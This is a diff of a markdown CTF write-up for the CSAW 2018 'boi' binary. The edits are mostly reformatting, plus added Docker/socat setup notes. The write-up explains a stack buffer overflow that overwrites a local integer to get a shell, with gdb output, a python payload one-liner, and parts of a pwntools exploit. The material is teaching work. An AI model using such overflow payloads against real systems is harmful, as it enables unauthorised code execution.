@@ -2,7 +2,7 @@
 
 Let's take a look at the binary:
 
-```
+```bash
 $    file boi
 boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
 $    pwn checksec boi [*] '/Hackery/pod/modules/bof_variable/csaw18_boi/boi'
@@ -19,7 +19,7 @@ Mon Jun 10 22:07:51 EDT 2019
 
 So we can see that we are dealing with a 64 bit binary with a Stack Canary and Non-Executable stack (those are two binary mitigations that will be discussed later). When we run the binary, we see that we are prompted for input (which we gave it `15935728`). It then provided us with the time and the date. When we look at the main function in Ghidra we see this:
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -29,7 +29,7 @@ undefined8 main(void)
   undefined4 uStack40;
   int target;
   long stackCanary;
- 
+
   stackCanary = *(long *)(in_FS_OFFSET + 0x28);
   input = 0;
   local_30 = 0;
@@ -53,17 +53,16 @@ undefined8 main(void)
 
 So we can see the program prints the string `Are you a big boiiiii??` with `puts`. Then it proceeds to scan in `0x18` bytes worth of data into `input`. In addition to that we can see that the `target` integer is initialized before the `read` call, then compared to a value after the `read` call. Looking at the decompiled code shows us the constants it is assigned and compared to as signed integers, however if we look at the assembly code we can see the constants as unsigned hex integers:
 
-
 We can see that the value that it is being assigned is `0xdeadbeef`:
 
-```
+```asm
         0040067e c7 45 e4        MOV        dword ptr [RBP + target],0xdeadbeef
                  ef be ad de
 ```
 
 We can also see that the value that it is being compared to is `0xcaf3baee`:
 
-```
+```asm
         004006a5 8b 45 e4        MOV        EAX,dword ptr [RBP + target]
         004006a8 3d ee ba        CMP        EAX,0xcaf3baee
                  f3 ca
@@ -78,19 +77,19 @@ Now to see what our input can reach, we can look at the stack layout in Ghidra. 
                              undefined8 __stdcall main(void)
              undefined8        RAX:8          <RETURN>
              undefined8        Stack[-0x10]:8 local_10                                XREF[2]:     00400659(W),
-                                                                                                   004006ca(R)  
+                                                                                                   004006ca(R)
              int               Stack[-0x24]:4 target                                  XREF[2]:     0040067e(W),
-                                                                                                   004006a5(R)  
-             undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     00400667(W)  
+                                                                                                   004006a5(R)
+             undefined8        Stack[-0x30]:8 local_30                                XREF[1]:     00400667(W)
              undefined8        Stack[-0x38]:8 input                                   XREF[2]:     0040065f(W),
-                                                                                                   0040068f(*)  
-             undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00400649(W)  
-             undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0040064c(W)  
+                                                                                                   0040068f(*)
+             undefined4        Stack[-0x3c]:4 local_3c                                XREF[1]:     00400649(W)
+             undefined8        Stack[-0x48]:8 local_48                                XREF[1]:     0040064c(W)
              long              HASH:5f6c2e9   stackCanary
                              main                                            XREF[5]:     Entry Point(*),
                                                                                           _start:0040054d(*),
                                                                                           _start:0040054d(*), 004007b4,
-                                                                                          00400868(*)  
+                                                                                          00400868(*)
         00400641 55              PUSH       RBP
 
 ```
@@ -125,23 +124,23 @@ Are you a big boiiiii??
 15935728
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
-$rax   : 0x9               
-$rbx   : 0x0               
+$rax   : 0x9
+$rbx   : 0x0
 $rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
-$rdx   : 0x18              
+$rdx   : 0x18
 $rsp   : 0x00007fffffffde70  →  0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"
 $rbp   : 0x00007fffffffdeb0  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
 $rsi   : 0x00007fffffffde80  →  "15935728"
-$rdi   : 0x0               
+$rdi   : 0x0
 $rip   : 0x00000000004006a5  →  <main+100> mov eax, DWORD PTR [rbp-0x1c]
-$r8    : 0x0               
-$r9    : 0x0               
-$r10   : 0x3               
-$r11   : 0x246             
+$r8    : 0x0
+$r9    : 0x0
+$r10   : 0x3
+$r11   : 0x246
 $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
 $r13   : 0x00007fffffffdf90  →  0x0000000000000001
-$r14   : 0x0               
-$r15   : 0x0               
+$r14   : 0x0
+$r15   : 0x0
 $eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -184,7 +183,7 @@ gef➤  x/10g 0x7fffffffde80
 
 Here we can see that our input `15935728` is `0x14` bytes away. When we give the input `00000000000000000000` + p32(`0xcaf3baee`). We need the hex address to be in least endian (least significant byte first) because that is how the elf will read in data, so we have to pack it that way in order for the binary to read it properly:
 
-```
+```bash
 $    python -c 'print "0"*0x14 + "\xee\xba\xf3\xca"' > input
 $    gdb ./boi
 GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
@@ -212,23 +211,23 @@ Starting program: /Hackery/pod/modules/bof_variable/csaw18_boi/boi < input
 Are you a big boiiiii??
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
-$rax   : 0x18              
-$rbx   : 0x0               
+$rax   : 0x18
+$rbx   : 0x0
 $rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
-$rdx   : 0x18              
+$rdx   : 0x18
 $rsp   : 0x00007fffffffde70  →  0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"
 $rbp   : 0x00007fffffffdeb0  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
 $rsi   : 0x00007fffffffde80  →  0x3030303030303030 ("00000000"?)
-$rdi   : 0x0               
+$rdi   : 0x0
 $rip   : 0x00000000004006a5  →  <main+100> mov eax, DWORD PTR [rbp-0x1c]
-$r8    : 0x0               
-$r9    : 0x0               
-$r10   : 0x3               
-$r11   : 0x246             
+$r8    : 0x0
+$r9    : 0x0
+$r10   : 0x3
+$r11   : 0x246
 $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
 $r13   : 0x00007fffffffdf90  →  0x0000000000000001
-$r14   : 0x0               
-$r15   : 0x0               
+$r14   : 0x0
+$r15   : 0x0
 $eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -274,30 +273,30 @@ gef➤  x/10g 0x7fffffffde80
 
 Here we can see that we have overwritten the integer with the value `0xcaf3baee`. When we continue onto the `cmp` instruction, we can see that we will pass the check:
 
-```
+```bash
 gef➤  b *0x4006a8
 Breakpoint 2 at 0x4006a8
 gef➤  c
 Continuing.
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
-$rax   : 0xcaf3baee        
-$rbx   : 0x0               
+$rax   : 0xcaf3baee
+$rbx   : 0x0
 $rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
-$rdx   : 0x18              
+$rdx   : 0x18
 $rsp   : 0x00007fffffffde70  →  0x00007fffffffdf98  →  0x00007fffffffe2d9  →  "/Hackery/pod/modules/bof_variable/csaw18_boi/boi"
 $rbp   : 0x00007fffffffdeb0  →  0x00000000004006e0  →  <__libc_csu_init+0> push r15
 $rsi   : 0x00007fffffffde80  →  0x3030303030303030 ("00000000"?)
-$rdi   : 0x0               
+$rdi   : 0x0
 $rip   : 0x00000000004006a8  →  <main+103> cmp eax, 0xcaf3baee
-$r8    : 0x0               
-$r9    : 0x0               
-$r10   : 0x3               
-$r11   : 0x246             
+$r8    : 0x0
+$r9    : 0x0
+$r10   : 0x3
+$r11   : 0x246
 $r12   : 0x0000000000400530  →  <_start+0> xor ebp, ebp
 $r13   : 0x00007fffffffdf90  →  0x0000000000000001
-$r14   : 0x0               
-$r15   : 0x0               
+$r14   : 0x0
+$r15   : 0x0
 $eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -331,7 +330,8 @@ $1 = 0xcaf3baee
 ```
 
 With all of that, we can write an exploit for this challenge:
-```
+
+```python
 # Import pwntools
 from pwn import *
 
@@ -352,7 +352,8 @@ target.interactive()
 ```
 
 When we run it:
-```
+
+```bash
 $    python exploit.py
 [+] Starting local process './boi': pid 9075
 [*] Switching to interactive mode
@@ -366,3 +367,23 @@ boi  exploit.py  input    Readme.md
 ```
 
 Just like that, we popped a shell!
+
+---
+
+Notice the path to bash `/bin/bash`, now it is commonly found under different path `/usr/bin/bash`.
+
+Could start docker container for this.
+
+```bash
+docker run --rm -it -u root --entrypoint=/bin/bash -p 5000:5000 -v "${PWD}:/app" -w "/app" ubuntu:22.04
+
+# install sockat
+apt update && apt install -y socat
+
+# start network service
+./socket.sh
+```
+
+## References
+
+- [Exploiting over Sockets](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
